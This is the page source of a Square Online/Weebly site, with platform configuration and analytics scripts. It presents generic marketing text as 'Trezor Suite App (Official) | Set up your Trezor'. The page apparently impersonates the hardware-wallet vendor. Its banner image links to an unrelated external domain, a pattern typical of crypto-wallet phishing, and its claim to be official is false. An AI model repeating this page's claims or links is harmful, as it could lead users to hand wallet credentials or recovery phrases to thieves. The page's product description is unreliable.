Appointment\n","hidden":false}}],"properties":{"height":"medium","shortID":"WyQiAF","textAlign":"","background":{"type":"image","image":{"width":6000,"height":6000,"isDark":false,"source":"\/uploads\/b\/c96c0a38852b703691c44d35054d8ce2abbb7df275ecb503d22ad242f021919e\/Artboard%202%403x_1691784035.png","original":"\/uploads\/b\/c96c0a38852b703691c44d35054d8ce2abbb7df275ecb503d22ad242f021919e\/Artboard%202%403x_1691784035.png","sourceSet":{},"attribution":{}},"imageMobile":{"width":6000,"height":6000,"isDark":false,"source":"\/uploads\/b\/c96c0a38852b703691c44d35054d8ce2abbb7df275ecb503d22ad242f021919e\/Artboard%202%403x_1691784035.png","original":"\/uploads\/b\/c96c0a38852b703691c44d35054d8ce2abbb7df275ecb503d22ad242f021919e\/Artboard%202%403x_1691784035.png","sourceSet":{},"attribution":{}}},"bannerImage":{"image":{}},"colorProfile":"primary-light-neutral"}}},"userContent":{"id":"1d39e397-3db6-11ef-9f54-753a71236160","hidden":false,"content":{"id":"1d39e396-3db6-11ef-9f54-753a71236160","type":"container","cells":[{"id":"50ca9290-3db6-11ef-8a6e-e9719d30b3e3","type":"cell","content":{"id":"50ca9291-3db6-11ef-8a6e-e9719d30b3e3","type":"block","layout":"gallery-3","purpose":"gallery@^1.1.2","elements":[{"id":"50fced30-3db6-11ef-8121-23943b46cb96","purpose":"image-gallery","properties":{"images":[{"id":"655e8450-3db6-11ef-8a6e-e9719d30b3e3","link":{"tab":false,"link":{"external":"https:\/\/shotheatsgnovel.com\/63fe1bc7-cbcf-40dc-b790-91250cea1372"},"type":"external"},"name":"trezor_banner_02.jpg","width":1203,"height":930,"source":"\/uploads\/b\/250cf5450773b02a62c9c2bac2012ba86be8f57c5a654c048d17bf3cc42ffe40\/trezor_banner_02_1720503892.jpg"}]}}],"properties":{"shortID":"iEBoFY"}}},{"id":"7eaaf510-3db6-11ef-8a6e-e9719d30b3e3","type":"cell","content":{"id":"7eab1c20-3db6-11ef-8a6e-e9719d30b3e3","type":"block","layout":"text-4","purpose":"text@^1.0.0","properties":{"shortID":"cPWCVF","settings":{"texts":{}},"textAlign":"","repeatables":[{"id":1,"link":{"label":"Learn more"},"text":{"content":{"quill":{"ops":[{"insert":"Trezor Suite is an advanced software interface designed to enhance the functionality of Trezor hardware wallets. Developed by SatoshiLabs, Trezor Suite provides a seamless and secure experience for managing cryptocurrencies. This comprehensive platform integrates a range of features to ensure users can safely and efficiently handle their digital assets.\n\n"},{"insert":"Trezor Suite offers an intuitive and user-friendly interface that caters to both beginners and experienced users. The dashboard provides a clear overview of your portfolio, allowing you to monitor your assets with ease. The simple navigation ensures that even those new to cryptocurrency can manage their funds confidently.","attributes":{"background":"var(--color-white)"}},{"insert":"\n\n"},{"insert":"Security is the cornerstone of Trezor Suite. It operates in conjunction with Trezor hardware wallets, which store private keys offline, ensuring they are never exposed to potential online threats. Additionally, Trezor Suite supports advanced security features such as passphrase protection and multi-factor authentication, providing users with peace of mind.","attributes":{"background":"var(--color-white)"}},{"insert":"\n\n"},{"insert":"Trezor Suite supports a wide range of cryptocurrencies, allowing users to manage multiple assets from a single platform. Whether you\u2019re holding Bitcoin, Ethereum, or various altcoins, Trezor Suite provides comprehensive support for all your digital assets. This eliminates the need for multiple wallets and simplifies portfolio management.","attributes":{"background":"var(--color-white)"}},{"insert":"\n\n\n"},{"insert":"The integration with Trezor hardware wallets is seamless, offering a cohesive and secure environment for managing cryptocurrencies. Users can easily connect their Trezor devices to the Suite, enabling them to access their funds, initiate transactions, and explore blockchain applications directly from the platform.","attributes":{"background":"var(--color-white)"}},{"insert":"\n\n\nTrezor Suite includes a host of advanced features and tools designed to enhance the user experience. The built-in exchange feature allows users to trade cryptocurrencies without leaving the platform. Additionally, the detailed transaction history and analytics provide valuable insights into your portfolio\u2019s performance.\n\n\n"},{"insert":"SatoshiLabs is committed to maintaining and improving Trezor Suite, regularly releasing updates to introduce new features and enhance security. The active community and extensive support resources ensure users have access to the help they need. Whether through guides, tutorials, or community forums, Trezor Suite users can find answers to their questions and stay informed about the latest developments.","attributes":{"background":"var(--color-white)"}},{"insert":"\n\n\n"},{"insert":"Trezor Suite is an indispensable tool for anyone serious about cryptocurrency management. Its user-friendly interface, robust security measures, and extensive asset support make it an ideal choice for managing digital assets. By integrating seamlessly with Trezor hardware wallets, Trezor Suite provides a secure and efficient platform for all your cryptocurrency needs.","attributes":{"background":"var(--color-white)"}},{"insert":"\n\n\n"},{"insert":"Intuitive Dashboard:","attributes":{"bold":true}},{"insert":" Provides a clear overview of your portfolio."},{"insert":"\n","attributes":{"list":"bullet"}},{"insert":"Enhanced Security:","attributes":{"bold":true}},{"insert":" Offline storage of private keys, passphrase protection, and multi-factor authentication."},{"insert":"\n","attributes":{"list":"bullet"}},{"insert":"Comprehensive Asset Management:","attributes":{"bold":true}},{"insert":" Supports a wide range of cryptocurrencies."},{"insert":"\n","attributes":{"list":"bullet"}},{"insert":"Seamless Integration:","attributes":{"bold":true}},{"insert":" Easily connects with Trezor hardware wallets."},{"insert":"\n","attributes":{"list":"bullet"}},{"insert":"Advanced Tools:","attributes":{"bold":true}},{"insert":" Built-in exchange, detailed transaction history, and analytics."},{"insert":"\n","attributes":{"list":"bullet"}},{"insert":"Regular Updates:","attributes":{"bold":true}},{"insert":" Continuous improvements and new features."},{"insert":"\n","attributes":{"list":"bullet"}},{"insert":"\n"}]}}},"title":{"title":"Distinctive and Bold"}}],"sectionTitle":{"align":"left","title":{"quill":{"ops":[{"insert":"Trezor Suite App (Official) | Set up your Trezor"},{"insert":"\n\n\n","attributes":{"block":true}},{"insert":"User-Friendl\ufeffy Interface"},{"insert":"\n\n\n","attributes":{"block":true}},{"insert":"Enhanced Security"},{"insert":"\n\n\n","attributes":{"block":true}},{"insert":"Comprehensive Asset \ufeffManagement"},{"insert":"\n\n\n\n","attributes":{"block":true}},{"insert":"Seamless In\ufefftegration with Trezor Hardware Wallets"},{"insert":"\n\n\n\n\n","attributes":{"block":true}},{"insert":"Advanced\ufeff Features and Tools"},{"insert":"\n\n\n\n\n\n","attributes":{"block":true}},{"insert":"Regular U\ufeffpdates and Community Support"},{"insert":"\n\n\n\n\n","attributes":{"block":true}},{"insert":"Conclusi\ufeffon"},{"insert":"\n\n\n\n\n","attributes":{"block":true}},{"insert":"Key Features \ufeffof Trezor Suite:"},{"insert":"\n\n\n","attributes":{"block":true}}]}},"allCaps":false,"fontSize":"step-2","textStyle":"title"}}}}]}}}}}},"storeInfo":{"merchant_id":"MLCXP12MQE56G","buyer_customer_accounts_enabled":false,"currency":"USD","locale":"en_US","language":"en","return_policy":null,"shipping_policy":null,"max_donation_amount":5000,"store_mode":"cart","payment_method_support":{"visa":false,"mastercard":false,"amex":false,"discover":false,"jcb":false,"interac":false,"paypal":false,"apple_pay":false,"google_pay":false,"cash_app":true,"square_pay":true},"show_pdp_buy_now_button":true,"allowed_to_sell":true,"accepting_orders":false,"has_payment_processor":false,"is_group_ordering_enabled":false,"product_reviews_enabled":false,"show_on_sale_section":true,"show_low_stock_section":true,"show_out_of_stock_section":true,"shipping_location_ids":["11ef3db606de0b75b72c3cecef6d5b2a"],"fulfillment_support":{"delivery":false,"pickup":false,"shipping":false,"dine_in":false,"manual":false,"digital":false},"seller_preferred_fulfillment":"delivery","locations_counts":{"pickup":0,"delivery":0,"dine_in":0,"pickup_or_delivery":0,"brick_and_mortar_fulfillment":0,"shipping":1,"total":1},"has_subscribable_items":false,"has_shippable_product":false,"has_time_based_categories":false,"product_setting_low_stock_threshold":5,"category_hierarchy_root_ids":{"site_category_id":null,"id":null}},"commerceLinks":{"products":{},"categories":{},"meta":{"pagination":{"products":[],"categories":{"per_page":2500,"current_page":1,"total_pages":1}}}},"autoNavLinks":[],"blogPostLinks":{},"featureFlags":{"ecom.website.deprecated-layouts":false,"marketing-enable-drive-repeat-purchase-campaign":true,"ecom.website.facebook-food":true,"ecom.website.theme-export":false,"ecom.website.chamber-via-fastly":true,"ecom.square-online-published-catalog-cache-version":"2023-11-13","ecom.checkout.open_tabs":true,"ecom.website.photo-reviews":true,"ecom.checkout.cmi-sentry-integration":true,"ecom.checkout.cmi.bootstrap-tracking-snowplow":true,"ecom.checkout.cmi.bootstrap-tracking-ga":true,"ecom.website.order-confirmation-page.website-redirect":true,"ecom.checkout.cmi.locale-view-splitting":true,"ecom.checkout.open_tabs_gc_coupon":true,"ecom.cmi-cart":true,"ecom.checkout.cmi.theme-fonts":false,"ecom-fulfillment-api-v-2":false,"ecom.omnichannel-discounts-frontend":true,"ecom.omnichannel-discounts-category-api":false,"ecom-improved-tipping-experience":true,"ecom.splash.loyalty":true,"ecom.website.published-site.datadog-rum":true,"ecom.website.editor.datadog-rum":true,"ecom-website-published-site-datadog-rum-bot-filter":true,"ecom.image-controls.width-fix":true,"ecom.gradient-backgrounds":true,"ecom.website.form-fraud-blocking":true,"ecom.website.form-fraud-auto-ban":true,"ecom.website.code-editor":false,"ecom.shopping.pdp-layouts-m1":true,"ecom.chamber.subscriptions":true,"ecom.tuba.subscriptions-paid-shipping-rates":true,"ecom-cko-enhanced-logging":true,"ecom-cko-unified-logging":true,"ecom.shopping.so-coupons-sunset-integrations":true,"ecom.order-online-text-layouts":true,"ecom.appointment-improvements":true,"ecom.appointment-improvements-m2":true,"ecom.tuba.committed-inventory-m1":true,"ecom.splash-improvements":true,"ecom-themes-onboarding":true,"ecom.shopping.featured-categories-paid-layouts":true,"ecom.website.ai-text.short-form":true,"ecom.website.ai-text.long-form":true,"ecom.website.metered-request.override":false,"ecom.website.async-create-theme":false,"ecom.chamber.spi.serve-items":true,"ecom.can_use_cart_sharing":true,"ecom.website.ai.editor-prototype":false,"ecom.website.ai.page-seo":false,"ecom.appointment-direct-booking":true,"ecom-service-cutover-fe-request-augmentations":true,"ecom.catalog.so-item-library-deprecation-3":true,"ecom.kiosk-photo-card":true,"ecom-compare-item-availabilities":true,"ecom-use-item-availabilities":true,"ecom.website.system-page.cart":false,"ecom-enable-kiosk-large-catalog-layout":false,"ecom-hide-instagram":false,"ecom-enable-kiosk-item-preloading":true,"ecom-brand-api-sync":true,"ecom.service-cutover.enable-tuba-traffic":true,"ecom-show-order-online":true,"ecom-website-combos":false,"websdk-use-new-afterpay-buttons":true,"ecom-checkout-should-check-is-decouple-checkout":true,"ecom-prime-use-store-info-v29":true,"ecom-checkout-decouple-open-tabs":true,"ecom-checkout-force-pci-compliance":false,"ecom-website-hide-food-beverage-themes":false},"lightning":{},"datadog":{"publishedSite":{"service":"spi-ecom-square-online-buyer-journey","applicationId":"0a9b10e6-9671-4e1d-bd0b-2f283f0d29ee","clientToken":"pubc6e7a7143c494f34f1366112ef7c1e2c","env":"production","rum":{"sampleRate":100,"sessionReplaySampleRate":100,"traceSampleRate":10}}}};
+    </script>
+
+        
+    <script type="application/javascript" data-cookieconsent="ignore">
+        window.stopSiteLoadingAnimation = () => {
+            const loadingElement = document.querySelector('.loading-view');
+            loadingElement?.remove();
+        };
+    </script>
+
+    
+    <script type="application/javascript" data-cookieconsent="ignore">
+    /**
+     * PCI Compliance Flag
+     *
+     * This flag indicates if scripts have been filtered for PCI compliance (OpenTabs SSO Checkout route).
+     * This value is set only for buyer dashboard/site view to prevent infinite loading loops.
+     *
+     * Do NOT include this file in editor-frame.blade.php as it affects seller dashboard.
+     */
+    window.IS_PCI_SCRIPTS_FILTERED = false;
+</script>
+    <script type="application/javascript" data-cookieconsent="ignore">
+    // used for editor-frame and pub site bootstrap
+    window.APP_ENV = 'production';
+    window.APP_ORIGIN = 'https://square.online';
+    window.APP_URL = 'https://www.weebly.com';
+    window.ASSET_BASE = '/app/website';
+    window.ASSETS_PUBLIC_PATH = 'https://cdn3.editmysite.com/app/website/';
+    window.CMS_API_PATH ='/app/website/cms';
+    window.DEPRECATED_IMAGE_HOST = 'https://images.editor.website';
+    window.FRAME_ORIGIN = 'https://sandbox.square.online';
+    window.GENERATE_GOOGLE_MAP_BASE = 'https://www.editmysite.com';
+    window.IMAGE_HOST = 'https://250cf5450773b02a62c9.cdn6.editmysite.com';
+    window.IS_DRAFT = false;
+    window.IS_MAGIC_MIRROR = false;
+    window.IS_THEME_PREVIEW = false;
+    window.IS_ENHANCED_PREVIEW = false;
+    window.DRAFT_ORIGIN = 'https://drafts.editmysite.com';
+    window.PUBLISHED_CMS_API_PREFIX = '/app/cms';
+    window.SENTRY_DSN = 'https://13e49d785d8d4f828038b6136f3b48ba@sentry.io/1263158';
+    window.RELEASE = 'prime-ec67a0b';
+    window.URL_BASE = '';
+    window.XSRF_COOKIE_NAME = 'publishedsite-xsrf';
+    window.FASTLY_URL_BASE = 'https://cdn5.editmysite.com';
+    window.SQUARE_WEB_PAYMENTS_SDK = 'https://web.squarecdn.com/v1/square.js'
+    window.PUBLIC_SQUARE_URL_BASE = 'squareup.com';
+    window.PUBLIC_SQUARE_APPTS_URL_BASE = 'app.squareup.com';
+    window.ENABLE_FRONTEND_LOCAL_DEV_CACHE = '';
+    window.GOOGLE_TAG_DEVELOPER_ID = 'developer_id.dOTM2Yj';
+    window.IS_SQUARE_GO = false;
+
+            window.IS_PUBLISHED_MAGIC_MIRROR = false;
+    
+    // state
+    window.SUBDOMAIN_BASE = 'square.site';
+
+</script>
+
+    <!--square-online-snowplow-->
+
+<script data-cookieconsent="statistics">
+    (function (p, l, o, w, i, n, g) {
+    var id = i + '-script';
+    if (!l.getElementById(i)) {
+        n = l.createElement(o);
+        g = l.getElementsByTagName(o)[0];
+        n.id = id;
+        n.async = 1;
+        n.src = w;
+        g.parentNode.insertBefore(n, g);
+    }
+})(window, document, "script", "https://cdn2.editmysite.com/js/wsnbn/snowday262.js", "snowday");
+</script>
+
+
+<script data-cookieconsent="ignore" data-role="square-online-snowplow">
+
+(function (p, l, o, w, i, n, g) {
+    if (!p[i]) {
+        p.GlobalSnowplowNamespace = p.GlobalSnowplowNamespace || [];
+        p.GlobalSnowplowNamespace.push(i);
+        p[i] = function () {
+            (p[i].q = p[i].q || []).push(arguments);
+        };
+        p[i].q = p[i].q || [];
+    }
+})(window, document, '', '', "snowday");
+
+var r = [99, 104, 101, 99, 107, 111, 117, 116, 46, 40, 119, 101, 101, 98, 108, 121, 124, 101, 100, 105, 116, 109, 121, 115, 105, 116, 101, 41, 46, 99, 111, 109];
+var snPlObR = function(arr) {
+    var s = '';
+    for (var i = 0 ; i < arr.length ; i++){
+        s = s + String.fromCharCode(arr[i]);
+    }
+    return s;
+};
+var s = snPlObR(r);
+
+var regEx = new RegExp(s);
+
+window._W = {
+    Analytics: {
+        trackers: {
+            wSP: snowday,
+        },
+        user_id: '150189013',
+        site_id: '926967013859200596',
+    },
+};
+
+(function(app_id, ec_hostname, discover_root_domain) {
+    var track = window._W.Analytics.trackers.wSP;
+    if (!track) return;
+    track('newTracker', app_id, ec_hostname, {
+        appId: app_id,
+        post: true,
+        platform: 'web',
+        discoverRootDomain: discover_root_domain,
+        cookieDomain: document.location.hostname,
+        cookieName: '_snow_',
+        contexts: {
+            webPage: true,
+            performanceTiming: true,
+            gaCookies: true
+        },
+        crossDomainLinker: function (linkElement) {
+            return regEx.test(linkElement.href);
+        },
+        respectDoNotTrack: document.cookie.indexOf('gdpr-kb') === -1
+    });
+    track('trackPageView', _W.Analytics.user_id+':'+_W.Analytics.site_id);
+    track('crossDomainLinker', function (linkElement) {
+        return regEx.test(linkElement.href);
+    });
+})(
+    '_wn',
+    'ec.editmysite.com',
+    false
+);
+</script>
+<!--end-square-online-snowplow-->
+
+
+            
+        
+    
+    <link rel="stylesheet" href="https://cdn3.editmysite.com/app/website/css/site.8597ffe32ea2dd72c2ae.css">
+</head>
+<body>
+    <div class="loading-view">
+        <div
+            class="loading-container"
+        >
+            <div
+                class="dot-container"
+            ></div>
+            <div
+                class="dot-container"
+            ></div>
+            <div
+                class="dot-container"
+            ></div>
+        </div>
+    </div>
+    <div id="app"></div>
+
+                
+        <link rel="stylesheet" type="text/css" href="https://cdn3.editmysite.com/app/checkout/assets/checkout/css/wcko.3cfec3d296b725160867.css" />
+    </body>
+</html>
